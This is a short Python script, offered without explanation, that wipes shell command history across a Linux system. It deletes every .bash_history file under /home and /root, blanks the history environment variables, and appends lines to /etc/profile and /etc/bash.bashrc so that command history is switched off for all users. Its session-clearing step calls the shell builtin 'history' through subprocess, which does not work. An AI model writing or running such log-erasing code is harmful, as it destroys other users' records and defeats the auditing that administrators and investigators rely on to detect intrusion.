import os
import subprocess

# Function to remove .bash_history files

def remove_bash_history_files(start_directory):
    for dirpath, dirnames, filenames in os.walk(start_directory):
        for filename in filenames:
            if filename == '.bash_history':
                file_path = os.path.join(dirpath, filename)
                try:
                    os.remove(file_path)
                    print(f'Removed: {file_path}')
                except Exception as e:
                    print(f'Error removing {file_path}: {e}')

# Function to clear the current session command history

def clear_command_history():
    try:
        subprocess.run(['history', '-c'], check=True)
        print('Cleared the current session command history.')
    except Exception as e:
        print(f'Error clearing command history: {e}')

# Function to modify environment variables

def modify_environment():
    os.environ['HISTFILE'] = ''
    os.environ['HISTSIZE'] = '0'
    print('Modified environment variables to disable history logging.')

# Function to append commands to disable future logging

def append_to_profile():
    commands = 'unset HISTFILE; export HISTSIZE=0'
    for file in ['/etc/profile', '/etc/bash.bashrc']:
        try:
            with open(file, 'a') as f:
                f.write(f'\n{commands}\n')
            print(f'Appended to {file}.')
        except Exception as e:
            print(f'Error appending to {file}: {e}')

if __name__ == '__main__':
    # Specify the directories to search
    directories_to_search = ['/home', '/root']
    for directory in directories_to_search:
        remove_bash_history_files(directory)
    clear_command_history()
    modify_environment()
    append_to_profile()
